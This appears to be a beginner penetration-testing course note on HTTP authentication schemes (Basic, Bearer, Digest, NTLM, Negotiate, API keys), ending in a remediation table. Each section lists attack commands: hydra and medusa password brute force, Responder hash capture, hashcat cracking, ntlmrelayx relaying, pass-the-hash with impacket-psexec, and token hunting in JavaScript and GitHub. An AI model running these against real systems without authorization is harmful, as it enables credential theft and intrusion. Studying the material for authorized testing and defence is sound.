---
tags: [vapt, http, web, beginner]
difficulty: beginner
module: "02 - HTTP Deep Dive"
topic: "02.13 HTTP Authentication Schemes"
---

# 02.13 — HTTP Authentication Schemes (Basic, Bearer, Digest, NTLM)

## What is it?

HTTP authentication schemes define HOW a client proves identity to a server. The scheme appears in the `Authorization` request header and the `WWW-Authenticate` response header (in 401 challenges). Each scheme has different security properties and attack surfaces.

---

## Authentication Flow

```
CLIENT                              SERVER
  │                                    │
  │ GET /secret HTTP/1.1 ────────────→│
  │                                    │
  │ ←──── HTTP/1.1 401 Unauthorized   │
  │        WWW-Authenticate: Basic realm="Admin Area"
  │                                    │
  │ GET /secret HTTP/1.1 ────────────→│
  │ Authorization: Basic YWRtaW46cGFzcw==
  │                                    │
  │ ←──── HTTP/1.1 200 OK             │
```

---

## Basic Authentication

```
SCHEME: Basic

HEADER FORMAT:
  Authorization: Basic [base64(username:password)]

EXAMPLE:
  username: admin, password: pass
  base64("admin:pass") = "YWRtaW46cGFzcw=="
  Authorization: Basic YWRtaW46cGFzcw==

Server challenge:
  HTTP/1.1 401 Unauthorized
  WWW-Authenticate: Basic realm="Admin Area"

SECURITY:
  ✗ BASE64 IS NOT ENCRYPTION — trivially reversible!
  ✗ Credentials sent with every request (not just login)
  ✗ No protection against replay attacks
  ✓ Simple to implement
  REQUIRES HTTPS for any security at all
```

**VAPT Attacks:**

```bash
# Decode Basic auth header immediately:
echo "YWRtaW46cGFzcw==" | base64 -d
# → admin:pass

# Brute force Basic auth:
hydra -l admin -P /usr/share/wordlists/rockyou.txt https-get://target.com/ \
  -s 443 -m "/admin" -I

# Medusa:
medusa -h target.com -u admin -P rockyou.txt -M http -m AUTH:BASIC

# Curl with basic auth:
curl -u admin:password https://target.com/admin

# Intercept and decode with Burp:
# All Basic auth credentials appear in cleartext in Burp's Decoder
```

---

## Bearer Token Authentication

```
SCHEME: Bearer (most common for APIs and OAuth)

HEADER FORMAT:
  Authorization: Bearer [token]

EXAMPLES:
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...   ← JWT
  Authorization: Bearer ghp_abc123xyz789...                         ← GitHub Personal Access Token
  Authorization: Bearer ya29.a0AbVbY...                             ← Google OAuth token

SECURITY:
  ✓ Token can be scoped/limited
  ✓ Can be revoked server-side
  ✗ Stolen token = full access (no re-auth required)
  ✗ Long-lived tokens = long exposure window
  Requires HTTPS to protect token in transit
```

**VAPT Attacks:**

```bash
# JWT attacks (if token is JWT):
# See [[Module JWT Security]] for full coverage
# Common attacks:
#   - alg:none bypass
#   - Weak secret brute force
#   - Algorithm confusion (RS256 → HS256)

# Find API tokens in:
# - JavaScript files: grep -r "Bearer\|token\|apikey" *.js
# - Mobile app: decompile APK, grep for headers
# - GitHub repos: github.com/search?q="Authorization: Bearer"

# Test token scope:
curl -H "Authorization: Bearer USER_TOKEN" https://api.target.com/admin/users
# If 200 → token has more privileges than intended

# Test token invalidation after logout:
TOKEN=$(login and capture token)
logout
curl -H "Authorization: Bearer $TOKEN" https://api.target.com/me
# Should return 401, not 200
```

---

## Digest Authentication

```
SCHEME: Digest

HEADER FORMAT:
  Authorization: Digest username="admin",
                        realm="example.com",
                        nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
                        uri="/api/data",
                        response="6629fae49393a05397450978507c4ef1"

HOW IT WORKS:
  1. Server sends nonce (one-time number) in 401 challenge
  2. Client computes: response = MD5(MD5(user:realm:pass):nonce:MD5(method:uri))
  3. Server does same computation, compares

SECURITY:
  ✓ Password not sent in cleartext (only hash)
  ✓ Nonce prevents simple replay
  ✗ Uses MD5 → weak hash, offline crack possible
  ✗ Server must store plaintext (or MD5 of username:realm:pass) → DB breach risk
  ✗ Vulnerable to replay within nonce validity period
  ✗ No protection for response body
```

**VAPT Attacks:**

```bash
# Capture Digest auth with Wireshark → extract hash components
# Crack offline with hashcat:
# Format: username:realm:nonce:uri:response

# Nmap Digest brute force:
nmap --script http-auth -p 80 target.com --script-args 'http-auth.user=admin,http-auth.pass=password'

# Hydra Digest auth:
hydra -l admin -P rockyou.txt http-head://target.com \
  -s 80 -m "/protected/"

# Curl with digest auth:
curl --digest -u admin:password https://target.com/protected/
```

---

## NTLM Authentication (Windows)

```
SCHEME: NTLM (NT LAN Manager)

USED FOR:
  Windows-integrated authentication (IIS, Exchange, SharePoint)
  Active Directory web apps

HANDSHAKE:
  1. Client:  GET /protected (no auth)
  2. Server:  401 + WWW-Authenticate: NTLM
  3. Client:  GET /protected + Authorization: NTLM (base64 Type1 negotiation msg)
  4. Server:  401 + WWW-Authenticate: NTLM (base64 Type2 challenge)
  5. Client:  GET /protected + Authorization: NTLM (base64 Type3 auth with NT hash response)
  6. Server:  200 OK (or 401 if auth fails)

SECURITY:
  ✓ Hash challenge (not plaintext password)
  ✗ NTLM hash crackable offline
  ✗ Pass-the-Hash attacks possible
  ✗ Relay attacks (NTLM relay → authenticate to other services)
```

**VAPT Attacks:**

```bash
# Detect NTLM auth headers (reveals domain name!)
curl -sI https://target.com | grep -i "www-authenticate\|ntlm\|negotiate"

# WWW-Authenticate: NTLM → Windows authentication
# WWW-Authenticate: Negotiate → Kerberos or NTLM (try Kerberos first)

# Capture NTLM hash via Responder (when victim authenticates to attacker-controlled resource):
sudo responder -I eth0
# Then trigger NTLM auth to attacker's share → capture NTLMv2 hash

# Crack captured NTLMv2 hash:
hashcat -m 5600 hash.txt rockyou.txt   # NTLMv2
hashcat -m 5500 hash.txt rockyou.txt   # NTLMv1

# Relay attack with ntlmrelayx:
sudo python3 ntlmrelayx.py -tf targets.txt -smb2support

# NTLM Pass-the-Hash (use hash directly, no cracking):
impacket-psexec administrator@target "cmd.exe" -hashes :NT_HASH
```

---

## Negotiate / Kerberos Authentication

```
SCHEME: Negotiate (tries Kerberos, falls back to NTLM)

Used in: Active Directory environments, SharePoint, Exchange

Token format:
  Authorization: Negotiate YIIGjgYGKwYBBQUCoIIG...  ← Kerberos ticket (ASN.1 encoded)

VAPT:
  Extract Kerberos ticket → crack offline (Kerberoasting)
  See [[Module 41 - Active Directory]] for full Kerberos attacks
```

---

## API Key Authentication

```
Not an HTTP standard, but widely used:

Common locations:
  Header: X-API-Key: abc123xyz
  Header: API-Key: abc123xyz
  Header: Authorization: ApiKey abc123xyz
  Query:  ?api_key=abc123xyz
  Query:  ?apikey=abc123xyz
  Query:  ?token=abc123xyz

SECURITY:
  ✗ API key in URL → appears in server logs, Referer header!
  ✗ API key committed to version control → public GitHub search!
  ✗ No expiry → valid forever once leaked

VAPT ATTACKS:
  Search GitHub: "api_key" site:target.com
  Search JS files: grep -r "api_key\|apikey\|api-key" *.js
  Test brute force: is API key rate limited?
  Test privilege: use one user's API key for another user's data
```

---

## Hands-On: Auth Header Testing

```bash
# Test Basic auth
curl -v -u admin:password https://target.com/admin
# Shows decoded in request: Authorization: Basic ...

# Decode any Basic auth header
echo "YWRtaW46cGFzcw==" | base64 -d; echo

# Test Bearer token with API
curl -H "Authorization: Bearer YOUR_TOKEN" https://api.target.com/users

# Test no auth (what happens without Authorization header?)
curl https://target.com/api/users
# 401 = requires auth (good)
# 200 = no auth required! (bad)

# Brute force Basic auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  https-get://target.com/admin

# Find exposed auth tokens in JS files
curl -s https://target.com/app.js | grep -iE "api.?key|bearer|token|secret" | head -20
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Basic auth without HTTPS | Enforce HTTPS, or switch to Bearer/OAuth |
| Long-lived tokens | Implement short-lived tokens with refresh |
| API keys in URLs | Move to headers, never in query strings |
| API keys committed to code | Use environment variables, secret managers |
| NTLM auth enabled on public endpoints | Use modern auth (OAuth, SAML) for external access |
| Token not invalidated on logout | Server-side token revocation / denylist |

---

## Related Notes
- [[11 - Cookies Structure Flags Lifecycle]] — session-based auth alternative
- [[12 - Sessions How Server-Side Sessions Work]] — server-side session management
- [[Module 04 - Authentication Attacks]] — brute force, bypass
- [[Module JWT Security]] — JWT Bearer token attacks
- [[Module 41 - Active Directory]] — NTLM relay, Kerberos attacks
